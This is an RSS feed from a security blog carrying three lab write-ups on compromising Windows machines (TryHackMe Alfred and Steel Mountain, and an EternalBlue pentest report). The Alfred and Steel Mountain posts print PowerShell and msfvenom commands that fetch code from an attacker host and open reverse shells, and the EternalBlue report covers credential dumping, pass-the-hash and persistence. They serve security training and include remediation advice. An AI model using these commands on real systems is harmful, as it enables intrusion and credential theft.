<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Windows on Gabriel Tello</title>
    <link>https://gtello.github.io/tags/windows/</link>
    <description>Recent content in Windows on Gabriel Tello</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
    <lastBuildDate>Fri, 15 Nov 2024 15:30:00 +0000</lastBuildDate>
    <atom:link href="https://gtello.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Alfred (THM)</title>
      <link>https://gtello.github.io/writeups/alfred/</link>
      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/alfred/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Here&amp;rsquo;s the writeup for the &lt;a href=&#34;https://tryhackme.com/r/room/alfred&#34;&gt;Alfred&lt;/a&gt; room on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;Let&amp;rsquo;s explore how we can exploit this Windows machine with an exposed Jenkins service. Using default credentials, we managed to execute remote commands through Jenkins’ build functionality and gained an initial foothold. From there, we escalated privileges using token impersonation techniques, eventually achieving full administrative control of the system.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;&#xA;&lt;p&gt;I started with a simple &lt;code&gt;nmap&lt;/code&gt; scan to find open ports and services running on the target.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Here&rsquo;s the writeup for the <a href="https://tryhackme.com/r/room/alfred">Alfred</a> room on TryHackMe.</p>
<h2 id="summary">Summary</h2>
<p>Let&rsquo;s explore how we can exploit this Windows machine with an exposed Jenkins service. Using default credentials, we managed to execute remote commands through Jenkins’ build functionality and gained an initial foothold. From there, we escalated privileges using token impersonation techniques, eventually achieving full administrative control of the system.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>I started with a simple <code>nmap</code> scan to find open ports and services running on the target.</p>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th>Operating System</th>
          <th>IP Address</th>
          <th>Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows Server</td>
          <td>10.10.149.26</td>
          <td>80, 3389, 8080</td>
      </tr>
  </tbody>
</table>
<p><img alt="nmap command and results" src="/images/posts/alfred/image1.png"></p>
<center><b>nmap command and results</b></center>
<p>Ports 80 and 8080 caught my attention. Popping open a browser, I checked them out. Port 8080 led me to a Jenkins login page, a tool often used for CI/CD.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Now the fun part! First, I tried some default credentials (<code>admin:admin</code>) and got lucky—they worked! That gave me full access to the Jenkins dashboard.</p>
<p><img alt="Jenkins Dashboard" src="/images/posts/alfred/image2.png"></p>
<center><b>Jenkins Dashboard</b></center>
<p>From there, I headed into the project configuration and used the &ldquo;Build&rdquo; section to execute commands. To get a shell, I used a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">PowerShell script</a> for a reverse connection:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>After hitting <strong>Build Now</strong>, I got a connection back to my attacker machine. Reverse shell achieved!</p>
<p><img alt="Reverse shell command in Jenkins" src="/images/posts/alfred/image3.png"></p>
<center><b>Reverse shell command in Jenkins</b></center>  
<p><img alt="Access via reverse shell" src="/images/posts/alfred/image4.png"></p>
<center><b>Access via reverse shell</b></center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>With the initial access sorted out, it was time to go higher. I created a payload for <code>meterpreter</code> using <code>msfvenom</code>:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Using <code>certutil</code>, I transferred the payload to the target machine and executed it. This gives us a <code>meterpreter</code> session, making escalation easier.</p>
<p><img alt="Metasploit listener setup" src="/images/posts/alfred/image5.png"></p>
<center><b>Metasploit listener setup</b></center>
<p>Checking the user privileges, we&rsquo;ll spot two key permissions: <code>SeDebugPrivilege</code> and <code>SeImpersonatePrivilege</code>. These let me impersonate tokens for processes with higher permissions. Using the <code>incognito</code> module in Metasploit, I exploited this to escalate privileges.</p>
<p><img alt="Using the incognito module" src="/images/posts/alfred/image6.png"></p>
<center><b>Using the incognito module</b></center>
<p>Finally, I migrated to a process with <code>SYSTEM</code> permissions, giving me full control over the machine.</p>
<p><img alt="Migrating to a privileged process" src="/images/posts/alfred/image7.png"></p>
<center><b>Migrating to a privileged process</b></center>
<h2 id="flags">Flags</h2>
<p>Once I had admin-level access, finding the flags was straightforward:</p>
<ul>
<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
</ul>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th>Tool</th>
          <th>What it Did</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>nmap</strong></td>
          <td>Scanned the network and identified open services.</td>
      </tr>
      <tr>
          <td><strong>Jenkins</strong></td>
          <td>Exploited using default credentials to execute commands.</td>
      </tr>
      <tr>
          <td><strong>msfvenom/metasploit</strong></td>
          <td>Generated payloads and escalated privileges with the incognito module.</td>
      </tr>
      <tr>
          <td><strong>certutil</strong></td>
          <td>Transferred the payload to the target machine.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>This box had a couple of big security issues: an exposed service with default credentials and poorly configured privileges. With these vulnerabilities, escalating to admin was almost too easy.</p>
<h2 id="recommendations">Recommendations</h2>
<ul>
<li><strong>Update Jenkins</strong> and always remove default credentials.</li>
<li>Set up a <strong>firewall</strong> to restrict unnecessary access.</li>
<li>Use <strong>strong password policies</strong> and regularly update them.</li>
<li>Limit user privileges to only what’s necessary.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Steel Mountain (THM)</title>
      <link>https://gtello.github.io/writeups/steelmountain/</link>
      <pubDate>Tue, 12 Nov 2024 22:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/steelmountain/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup for the &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; room on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup for the <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> room on TryHackMe.</p>
<h2 id="summary">Summary</h2>
<p>We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.</p>
<p>After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>We started with a network scan using nmap to see which ports were open and what services were running on them.</p>
<p><img alt="nmap Result" src="/images/posts/steelmountain/image1.png"></p>
<center><em>Figure 1:</em> nmap result</center>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th>Operating System</th>
          <th>IP Address</th>
          <th>Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows Server 2008</td>
          <td>10.10.128.109</td>
          <td>80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
      </tr>
  </tbody>
</table>
<h2 id="exploitation">Exploitation</h2>
<p>When exploring port 80 in the browser, we found the Steel Mountain homepage with an &ldquo;Employee of the Month&rdquo; named Bill Harper (name taken from the image file). On port 8080, we discovered a Rejetto HTTP server that was exposed and vulnerable to a Remote Command Execution (RCE) exploit in HFS version 2.3.x. We used metasploit to launch the exploit and obtain a reverse shell connection to the server. The first flag was found on the user’s desktop.</p>
<p><img alt="Steel Mountain Homepage" src="/images/posts/steelmountain/image2.png"></p>
<center><em>Figure 2:</em> Steel Mountain Homepage</center>
<p><img alt="Exposed Rejetto HTTP Server" src="/images/posts/steelmountain/image3.png"></p>
<center><em>Figure 3:</em> Exposed Rejetto HTTP Server</center>
<p><img alt="Shell Obtained in Metasploit" src="/images/posts/steelmountain/image4.png"></p>
<center><em>Figure 4:</em> Shell obtained in metasploit</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>With initial access to the system, we ran the <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> script in PowerShell to identify potential configuration issues on the Windows system. The script detected that the <code>AdvancedSystemCareService9</code> service had misconfigured permissions:</p>
<ul>
<li>The service path was unquoted and included spaces, which is vulnerable on Windows.</li>
<li>The service was set with modifiable permissions, allowing non-privileged users to make changes.</li>
</ul>
<p><img alt="Using PowerUp Script" src="/images/posts/steelmountain/image5.png"></p>
<center><em>Figure 5:</em> Using PowerUp Script</center>
<p>We created a reverse shell payload with msfvenom using the command:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>This command generated a <code>CleanupService.exe</code> executable with a reverse shell payload back to our machine. We uploaded this file to the server, replaced the legitimate service executable, and restarted it using <code>sc stop</code> and <code>sc start</code>, executing our payload and gaining administrator access.</p>
<p><img alt="Executable Replaced" src="/images/posts/steelmountain/image6.png"></p>
<center><em>Figure 6:</em> Executable replaced</center>
<p>Once inside the system, we obtained the final flag.</p>
<p><img alt="System Access" src="/images/posts/steelmountain/image7_1.png"><br>
<img alt="Flag Obtained" src="/images/posts/steelmountain/image7_2.png"></p>
<center><em>Figure 7:</em> Access to Administrator Account</center>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th>Tool</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>nmap</td>
          <td>For initial reconnaissance and detection of open ports and services.</td>
      </tr>
      <tr>
          <td>metasploit</td>
          <td>To launch the exploit against the Rejetto HTTP server.</td>
      </tr>
      <tr>
          <td>PowerUp.ps1</td>
          <td>PowerShell script for analyzing privilege configurations on Windows systems.</td>
      </tr>
      <tr>
          <td>msfvenom</td>
          <td>To generate the reverse shell payload used to obtain administrator permissions.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>This machine was quite vulnerable, with poorly configured web services and insecure permissions in some services, which made both the initial access and privilege escalation relatively easy.</p>
<h2 id="recommendations">Recommendations</h2>
<p>To improve security:</p>
<ol>
<li>Restrict access to non-essential ports and limit access to trusted IPs.</li>
<li>Update or replace the Rejetto HTTP server to close potential vulnerabilities.</li>
<li>Review and adjust service configurations, ensuring paths are quoted and modification permissions are secure.</li>
<li>Implement real-time monitoring and access control to detect any unauthorized activity on the system.</li>
</ol>
</div>]]></content:encoded>
    </item>
    <item>
      <title>Eternal Machine (EternalBlue)</title>
      <link>https://gtello.github.io/writeups/eternalblue/</link>
      <pubDate>Fri, 18 Oct 2024 09:15:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/eternalblue/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;This is a step-by-step guide presented in a professional report format about a pentest performed on a Windows 7 machine.&#xD;&#xA;&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;&#xA;&lt;p&gt;During the penetration test, it was discovered that the Eternal machine (Windows 7) was vulnerable to the EternalBlue exploit (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2017-0144&#34;&gt;CVE-2017-0144&lt;/a&gt;). This exploit allows an unauthenticated attacker to remotely execute arbitrary code and gain full control of the system. The vulnerability was used to compromise the Eternal machine, which allowed access to sensitive data and other systems on the network. This report details the exploitation process, findings, and recommendations to mitigate this vulnerability.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
This is a step-by-step guide presented in a professional report format about a pentest performed on a Windows 7 machine.
<h2 id="executive-summary">Executive Summary</h2>
<p>During the penetration test, it was discovered that the Eternal machine (Windows 7) was vulnerable to the EternalBlue exploit (<a href="https://nvd.nist.gov/vuln/detail/cve-2017-0144">CVE-2017-0144</a>). This exploit allows an unauthenticated attacker to remotely execute arbitrary code and gain full control of the system. The vulnerability was used to compromise the Eternal machine, which allowed access to sensitive data and other systems on the network. This report details the exploitation process, findings, and recommendations to mitigate this vulnerability.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>A network scan was performed using the nmap tool to identify open ports and services on the machine.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image1.png" alt="nmap command" />
</div>
<center><em>Figure 1:</em> Nmap command and results</center>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th>Operating System</th>
          <th>IP Address</th>
          <th>Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows 7 x64 SP 1</td>
          <td>192.168.1.167</td>
          <td>135, 139, 445, 49152-49158</td>
      </tr>
  </tbody>
</table>
<h3 id="vulnerability-verification">Vulnerability Verification</h3>
<p>The SMB service running on port 445 on a Windows 7 machine indicates a potential vulnerability to the EternalBlue exploit. An additional scan with an nmap script revealed that the system was indeed vulnerable to CVE-2017-0144 (EternalBlue).</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image2.png" alt="nmap confirmation" />
</div>
<center><em>Figure 2:</em> EternalBlue vulnerability confirmation</center>
<h2 id="exploitation">Exploitation</h2>
<p>The Metasploit framework was used to exploit the vulnerability. The EternalBlue module was selected and configured.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image3.png" alt="exploit configuration" />
</div>
<center><em>Figure 3:</em> Exploit configuration</center>
<p>A reverse shell payload was configured, allowing a remote connection with full system control. The exploit provided SYSTEM privileges, so no additional elevation was needed.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image4.png" alt="exploit execution" />
</div>
<center><em>Figure 4:</em> Exploit execution results</center>
<h2 id="post-exploitation">Post-Exploitation</h2>
<p>Once the meterpreter session was established, post-exploitation activities were carried out.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image5.png" alt="user enumeration" />
</div>
<center><em>Figure 5:</em> User enumeration</center>
<h3 id="credential-extraction">Credential Extraction</h3>
<p>The Mimikatz tool was used through the kiwi module to extract credentials such as passwords and hashes from the Windows operating system.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image6.png" alt="mimikatz execution" />
</div>
<center><em>Figure 6:</em> Mimikatz execution</center>
<p>The SAM (Security Account Manager) file stores password hashes for local users on a Windows system. Using the <code>kiwi_cmd lsadump::sam</code> command in meterpreter, the SAM file containing the NTLM hashes of local users&rsquo; passwords was extracted.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image7.png" alt="local user hash dump" />
</div>
<center><em>Figure 7:</em> Local user hash dump</center>
<h3 id="using-encrypted-credentials">Using Encrypted Credentials</h3>
<p>Once the password hashes were obtained, the Pass The Hash (PTH) technique was used to access other system resources without needing to know the plaintext passwords. This method allows authentication and lateral movement between Windows systems using only the password hash.<br>
The <code>crackmapexec</code> tool was used to remotely authenticate to other systems or services on the network using a user&rsquo;s hash.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image8.png" alt="crackmapexec execution" />
</div>
<center><em>Figure 8:</em> CrackMapExec execution</center>
<h3 id="persistence">Persistence</h3>
<p>Persistence allows maintaining access to a compromised system even if it is restarted, enabling reconnection in the future without having to repeat the initial exploitation process.<br>
In this case, a persistence script was configured using the <code>windows/local/persistence_service</code> module, which generates and loads an executable on the remote host and then turns it into a persistent service.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image9.png" alt="persistence execution" />
</div>
<center><em>Figure 9:</em> Persistence service execution</center>
<p>When this module is executed, meterpreter installs a service on the compromised system that establishes an outbound reverse shell connection every time the system is restarted. This means that even if the attacker loses the initial connection, they can regain access without re-exploiting the system, as long as the system is powered on and the attacker is listening on the configured port.</p>
<h3 id="persistence-check">Persistence Check</h3>
<p>To verify that persistence was successfully executed, the open meterpreter sessions were closed.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image10.png" alt="session closure" />
</div>
<center><em>Figure 10:</em> Session closure</center>
<p>A resource script was created to automate repetitive tasks in Metasploit, making it easier to reconnect to the compromised machine by simply running the script.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image11.png" alt="resource script for metasploit" />
</div>
<center><em>Figure 11:</em> Resource script for Metasploit</center>
<p>Once the script was executed, the payload and module were automatically configured, leading to a reconnection to the machine, confirming that persistence worked correctly.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image12.png" alt="resource script execution" />
</div>
<center><em>Figure 12:</em> Resource script execution</center>
<h3 id="persistence-cleanup">Persistence Cleanup</h3>
<p>To clean up the attacked system, the created service named lsass1 was closed and deleted using <code>sc.exe</code> commands, ensuring the removal of the persistence service from the system. Additionally, <code>taskkill.exe</code> was used to forcibly terminate the associated process <code>sdvj.exe</code>, which was linked to the persistence payload.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image13.png" alt="persistence cleanup" />
</div>
<center><em>Figure 13:</em> Persistence cleanup</center>
<p>After completing these steps, the Meterpreter session was securely closed, confirming the termination of the connection. This ensured that all artifacts of the persistence mechanism were removed, leaving no unauthorized access points on the system.</p>
<h2 id="flags">Flags</h2>
<p>A search for flags was carried out using the <code>search</code> command in meterpreter, and the <code>type</code> command was used to display their contents.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image14.png" alt="flags found" />
</div>
<center><em>Figure 14:</em> Flags found</center>
<p>Thus, the two flags were found, which are:</p>
<table>
  <thead>
      <tr>
          <th>Flag</th>
          <th>Hash</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>flag1.txt</td>
          <td>0ef3b7d488b11e3e800f547a0765da8e</td>
      </tr>
      <tr>
          <td>flag2.txt</td>
          <td>a63c1c39c0c7fd570053343451667939</td>
      </tr>
  </tbody>
</table>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th>Tool</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Nmap</td>
          <td>Used for the initial system scan and to identify open ports and services on the target.</td>
      </tr>
      <tr>
          <td>Metasploit</td>
          <td>Used to exploit the EternalBlue vulnerability (CVE-2017-0144) with a reverse shell payload.</td>
      </tr>
      <tr>
          <td>Mimikatz/kiwi</td>
          <td>Used within Meterpreter to extract Windows system credential hashes.</td>
      </tr>
      <tr>
          <td>CrackMapExec and PTH</td>
          <td>Allowed lateral movement in the machine without needing plaintext passwords, using only hashes.</td>
      </tr>
      <tr>
          <td>Persistence with Metasploit</td>
          <td>Persistence configuration using the windows/local/persistence_service module to ensure continuous access.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>The EternalBlue vulnerability exploited on the Eternal machine shows serious security flaws in its infrastructure, allowing an unauthenticated attacker to gain full control of the system. Once the system was compromised, credentials were captured, access to additional resources was gained, and persistence was set up, demonstrating how easily lateral movements and prolonged access can be maintained without detection.</p>
<h2 id="recommendations">Recommendations</h2>
<p>To mitigate this vulnerability, it is recommended to disable the SMBv1 protocol to prevent future EternalBlue-type exploits. In cases like this, it is important to isolate critical systems in protected network segments using VLANs and robust firewall configurations, as well as restricting SMB traffic on port 445 to only what is necessary, while continuously monitoring suspicious connections.</p>
<p>It is suggested to implement IDS/IPS solutions to detect exploitation attempts and use a SIEM to consolidate and analyze logs, to facilitate early threat detection.</p>
<p>Finally, it is recommended to migrate from Windows 7 to a more recent version, such as Windows 10, to benefit from enhanced security and continuous support.</p>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
